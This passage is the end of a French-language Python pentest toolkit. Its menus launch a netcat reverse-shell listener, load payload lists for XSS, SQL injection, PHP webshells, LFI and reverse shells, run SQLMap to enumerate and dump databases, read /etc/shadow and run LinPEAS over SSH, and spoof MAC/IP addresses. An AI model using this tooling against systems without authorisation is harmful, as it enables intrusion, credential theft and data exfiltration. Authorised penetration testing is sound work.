            except Exception:
                pass

        Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")

    def _netcat_listener(self):
        """Lance un listener netcat sur un port spécifié"""
        console.print("\n[orange1]═══ NETCAT LISTENER ═══[/orange1]")

        # Afficher les interfaces dispo
        ifaces_with_ip = []
        try:
            result = subprocess.run(['ip', '-4', 'addr'], capture_output=True, text=True)
            current_iface = None
            for line in result.stdout.split('\n'):
                m_iface = re.match(r'\d+: (\S+):', line)
                if m_iface:
                    current_iface = m_iface.group(1)
                m_ip = re.search(r'inet (\d+\.\d+\.\d+\.\d+)/(\d+)', line)
                if m_ip and current_iface and current_iface != 'lo':
                    ifaces_with_ip.append((current_iface, m_ip.group(1)))
        except Exception:
            pass

        if ifaces_with_ip:
            console.print("\n[orange1]Interfaces disponibles:[/orange1]")
            for iface, ip in ifaces_with_ip:
                color = "bold green" if 'tun' in iface else "white"
                console.print(f"  [{color}]{iface:20} {ip}[/{color}]")

        port = Prompt.ask("\n[orange1]Port d'écoute[/orange1]", default="4444")
        try:
            port_int = int(port)
            if not (1 <= port_int <= 65535):
                raise ValueError
        except ValueError:
            console.print("[error]Port invalide[/error]")
            return

        # Détecter quel netcat est dispo
        nc_cmd = None
        for candidate in ['ncat', 'nc', 'netcat']:
            r = subprocess.run(['which', candidate], capture_output=True)
            if r.returncode == 0:
                nc_cmd = candidate
                break
        if not nc_cmd:
            console.print("[error]netcat/ncat non trouvé — installez: sudo apt install ncat[/error]")
            return

        # ncat supporte -k (keep-open), nc classique non
        if nc_cmd == 'ncat':
            cmd = [nc_cmd, '-lnvp', port, '--keep-open']
            keep_info = "[dim](--keep-open : relance après déconnexion)[/dim]"
        else:
            cmd = [nc_cmd, '-lnvp', port]
            keep_info = ""

        console.print(f"\n[success]🎧 Listener lancé sur le port [bold]{port}[/bold] {keep_info}[/success]")
        console.print("[warning]Ctrl+C pour arrêter[/warning]\n")
        console.print(f"[dim]$ {' '.join(cmd)}[/dim]\n")

        try:
            subprocess.run(cmd)
        except KeyboardInterrupt:
            console.print("\n[warning]Listener arrêté[/warning]")
        except FileNotFoundError:
            console.print(f"[error]{nc_cmd} non trouvé[/error]")

    def payload_menu(self):
        """Menu Payloads"""
        console.print("\n[title]═══ GESTIONNAIRE DE PAYLOADS ═══[/title]")
        
        payload_files = {
            "1": "jspayload.csv",
            "2": "sqlpayload.csv",
            "3": "phppayload.csv",
            "4": "htmlpayload.csv",
            "5": "lfipayload.csv",
            "6": "revshellpayload.csv",
        }
        
        console.print("\n[orange1]Fichiers de payloads:[/orange1]")
        console.print("  1. [cyan]JavaScript / XSS[/cyan]          (jspayload.csv)")
        console.print("  2. [cyan]SQL Injection[/cyan]              (sqlpayload.csv)")
        console.print("  3. [cyan]PHP RCE / Webshells[/cyan]        (phppayload.csv)")
        console.print("  4. [cyan]HTML / CSRF / SSTI / SSRF[/cyan]  (htmlpayload.csv)")
        console.print("  5. [cyan]LFI / Path Traversal[/cyan]       (lfipayload.csv)")
        console.print("  6. [bold red]🐚 Reverse Shells multi-langages[/bold red]  [dim](bash/python/nc/php/ruby/go/ps...)[/dim]")
        
        choice = Prompt.ask("Choisissez un fichier", default="1")
        
        if choice in payload_files:
            PayloadManager.display_and_select_payload(payload_files[choice])
        
        Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
    
    def sqlmap_menu(self):
        """Menu SQLMap"""
        console.print("\n[title]═══ SCANNER SQLMAP ═══[/title]")
        console.print("\n[info]SQLMap teste automatiquement plusieurs types d'injections SQL[/info]")
        console.print("[info]Il NE nécessite PAS de payloads manuels - il génère ses propres tests[/info]\n")
        
        url = Prompt.ask("\n[orange1]URL cible (ex: http://site.com/page.php?id=1)[/orange1]")
        options = Prompt.ask("[orange1]Options supplémentaires (optionnel)[/orange1]", default="")
        
        info = SQLMapScanner.scan_url(url, options)
        
        if info and info.get('vulnerable'):
            if Confirm.ask("\nÉnumérer les bases de données?"):
                console.print("\n[warning]Énumération des bases...[/warning]")
                SQLMapScanner.scan_url(url, "--dbs")
            
            if Confirm.ask("\nDumper une table spécifique?"):
                database = Prompt.ask("Nom de la base de données")
                table_name = Prompt.ask("Nom de la table")
                SQLMapScanner.dump_table(url, database, table_name)
        
        Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
    
    def ssh_menu(self):
        """Menu SSH"""
        console.print("\n[title]═══ EXPLOITATION SSH ═══[/title]")
        
        # Filtrer les hôtes SSH
        ssh_hosts = SSHManager.get_ssh_hosts(self.scan_results)
        
        if not ssh_hosts:
            console.print("[warning]Aucun hôte SSH trouvé. Effectuez d'abord un scan Nmap.[/warning]")
            Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
            return
        
        console.print("\n[orange1]Hôtes SSH disponibles:[/orange1]")
        for idx, host in enumerate(ssh_hosts, 1):
            console.print(f"  {idx}. {host['ip']}:{host['port']}")
        
        host_choice = Prompt.ask("Choisissez un hôte", default="1")
        
        try:
            host_idx = int(host_choice) - 1
            selected_host = ssh_hosts[host_idx]
            
            # Demande des credentials
            user = Prompt.ask("\n[orange1]Nom d'utilisateur[/orange1]")
            password = Prompt.ask("[orange1]Mot de passe[/orange1]", password=True)
            
            self.ssh_credentials[selected_host['ip']] = {
                'user': user,
                'password': password
            }
            
            # Menu d'exploitation
            while True:
                console.print(f"\n[title]═══ EXPLOITATION DE {selected_host['ip']} ═══[/title]")
                console.print("\n1. 🔍 Scanner les fichiers (.txt, binaires, .sh)")
                console.print("2. 🛡️  Exécuter LinPEAS")
                console.print("3. 👥 Lister les utilisateurs (/etc/shadow)")
                console.print("4. 🔑 Afficher les permissions")
                console.print("0. ← Retour")
                
                sub_choice = Prompt.ask("\n[orange1]Choix[/orange1]", default="0")
                
                if sub_choice == "1":
                    SSHManager.scan_files(selected_host['ip'], user, password)
                elif sub_choice == "2":
                    SSHManager.run_linpeas(selected_host['ip'], user, password)
                elif sub_choice == "3":
                    SSHManager.get_shadow_users(selected_host['ip'], user, password)
                elif sub_choice == "4":
                    SSHManager.get_permissions(selected_host['ip'], user, password)
                elif sub_choice == "0":
                    break
                
                if sub_choice != "0":
                    Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
        
        except (ValueError, IndexError):
            console.print("[error]Choix invalide[/error]")
            Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
    
    def spoofing_menu(self):
        """Menu Spoofing"""
        console.print("\n[title]═══ SPOOFING MAC/IP ═══[/title]")
        
        console.print("\n[orange1]Interfaces disponibles:[/orange1]")
        for idx, iface in enumerate(self.interfaces, 1):
            console.print(f"  {idx}. {iface['name']}")
        
        iface_choice = Prompt.ask("Choisissez une interface", default="1")
        
        try:
            iface_idx = int(iface_choice) - 1
            selected_iface = self.interfaces[iface_idx]['name']
            
            console.print("\n1. 🎭 Spoof MAC")
            console.print("2. 🌐 Spoof IP")
            
            spoof_choice = Prompt.ask("Type de spoofing", default="1")
            
            if spoof_choice == "1":
                mac = Prompt.ask(
                    "[orange1]Nouvelle MAC (vide pour aléatoire)[/orange1]",
                    default=""
                )
                NetworkSpoofer.spoof_mac(
                    selected_iface,
                    mac if mac else None
                )
            elif spoof_choice == "2":
                ip = Prompt.ask(
                    "[orange1]Nouvelle IP (vide pour aléatoire)[/orange1]",
                    default=""
                )
                NetworkSpoofer.spoof_ip(
                    selected_iface,
                    ip if ip else None
                )
        
        except (ValueError, IndexError):
            console.print("[error]Choix invalide[/error]")
        
        Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")
    
    def open_url_menu(self):
        """Menu ouverture URL"""
        console.print("\n[title]═══ OUVERTURE URL ═══[/title]")
        
        # Afficher les résultats de scan avec ports HTTP/HTTPS
        http_services = []
        for result in self.scan_results:
            for port in result.get('ports', []):
                if port['service'] in ['http', 'https', 'http-proxy', 'ssl/http']:
                    http_services.append({
                        'ip': result['ip'],
                        'port': port['port'],
                        'service': port['service']
                    })
        
        if not http_services:
            console.print("[warning]Aucun service HTTP/HTTPS trouvé dans les scans.[/warning]")
            url = Prompt.ask("\n[orange1]Entrez une URL manuellement[/orange1]")
            subprocess.run(['chromium', url])
        else:
            console.print("\n[orange1]Services HTTP/HTTPS trouvés:[/orange1]")
            for idx, svc in enumerate(http_services, 1):
                protocol = 'https' if 'https' in svc['service'] or 'ssl' in svc['service'] else 'http'
                console.print(f"  {idx}. {protocol}://{svc['ip']}:{svc['port']}")
            
            choice = Prompt.ask("Choisissez un service à ouvrir", default="1")
            
            try:
                svc_idx = int(choice) - 1
                selected = http_services[svc_idx]
                protocol = 'https' if 'https' in selected['service'] or 'ssl' in selected['service'] else 'http'
                url = f"{protocol}://{selected['ip']}:{selected['port']}"
                
                console.print(f"[success]Ouverture de {url}...[/success]")
                subprocess.run(['chromium', url])
            except (ValueError, IndexError):
                console.print("[error]Choix invalide[/error]")
        
        Prompt.ask("\n[warning]Appuyez sur Entrée pour continuer[/warning]")


def main():
    """Point d'entrée principal"""
    try:
        app = PentestTool()
        app.main_menu()
    except KeyboardInterrupt:
        console.print("\n[warning]Interruption utilisateur[/warning]")
    except Exception as e:
        console.print(f"\n[error]Erreur fatale: {e}[/error]")


if __name__ == "__main__":
    main()